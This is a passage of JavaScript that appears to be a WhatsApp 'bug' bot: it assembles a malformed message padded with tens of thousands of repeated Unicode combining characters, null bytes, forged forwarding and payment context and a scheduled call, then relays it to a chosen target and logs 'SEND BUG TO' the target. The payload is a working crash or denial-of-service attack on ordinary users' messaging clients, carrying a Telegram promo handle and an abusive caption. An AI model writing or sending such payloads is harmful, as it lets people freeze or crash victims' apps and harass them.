                            directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1743848703"
                        }
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_call",
                                buttonParamsJson: "ꦾ".repeat(6000)
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: "ꦾ".repeat(6000)
                            }
                        ]
                    },
                    newsletterAdminInviteMessage: {},
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 1000,
                        title: "OVALIUM IS HERE" + "ꦽ".repeat(1000),
                        inviteCode: "t.me/Xwarrxxx",
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: "1975@s.whatsapp.net",
                            },
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 1,
                                    expiryTimestamp: null,
                                }
                            },
                            externalAdReply: {
                                renderLargerThumbnail: true,
                                showAdAttribution: true,
                                body: "ꦾ".repeat(35000),
                                title: "ི꒦ྀ".repeat(9000),
                                sourceUrl: "https://t.me/Xwarrxxx" + "ི꒦ྀ".repeat(9000) + "\u0000",
                                thumbnailUrl: null,
                                quotedAd: {
                                    advertiserName: "ི꒦ྀ".repeat(9000),
                                    mediaType: 2,
                                    jpegThumbnail: "/9j/4AAKossjsls7920ljspLli",
                                    caption: "Fuck You",
                                },
                                pleaceKeyHolder: {
                                    remoteJid: "0@s.whatsapp.net",
                                    fromMe: false,
                                    id: "XXNXXX",
                                }
                            }
                        }
                    }
                }
            }
        }
    };
    
    await sock.relayMessage(target, msg2, {
        messageId: null,
        participant: { jid: target },
    });
    console.log(`SEND BUG TO ${target}`);
 }

bot.launch()
